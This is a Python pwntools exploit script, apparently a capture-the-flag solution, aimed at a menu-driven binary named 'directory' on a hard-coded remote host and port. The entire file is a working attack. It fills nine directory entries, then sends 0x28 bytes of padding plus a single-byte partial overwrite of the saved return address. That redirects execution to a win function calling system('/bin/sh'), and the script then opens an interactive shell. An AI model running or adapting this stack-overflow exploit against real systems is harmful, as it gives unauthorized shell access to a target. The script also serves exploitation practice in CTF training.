#!/usr/bin/env python3
from pwn import *
import sys

HOST = "35.198.180.77"
PORT = 30993

binary = "./directory"
elf    = ELF(binary, checksec=False)
context.binary = elf
context.log_level = "info"

def add_name(io, name: bytes):
    io.sendlineafter(b"> ", b"1")
    io.recvuntil(b"Enter name: ")
    io.send(name)          # raw send – we control the exact bytes

def remove_name(io, idx: int):
    io.sendlineafter(b"> ", b"2")
    io.recvuntil(b"Enter index: ")
    io.sendline(str(idx).encode())

def print_dir(io):
    io.sendlineafter(b"> ", b"3")

def do_exit(io):
    io.sendlineafter(b"> ", b"4")

def pwn():
    if "REMOTE" in sys.argv:
        io = remote(HOST, PORT)
    else:
        io = process(binary)

    log.info("Step 1: fill 9 entries (0-8) to bring count to 9")
    for i in range(9):
        add_name(io, f"name{i}\n".encode())

    log.info("Step 2: add entry 9 — overflow return address")
    # Payload: 0x28 bytes padding (fills entry slot + overwrites saved rbp)
    #        + 0x3b (one byte partial-overwrite → win+4 for stack alignment)
    # Total: 0x29 bytes  — NO newline so read() returns exactly 0x29
    payload = b"A" * 0x28 + b"\x3b"
    add_name(io, payload)

    log.info("Step 3: choose exit → trigger ret → win+4 → system('/bin/sh')")
    do_exit(io)

    io.interactive()

if __name__ == "__main__":
    pwn()
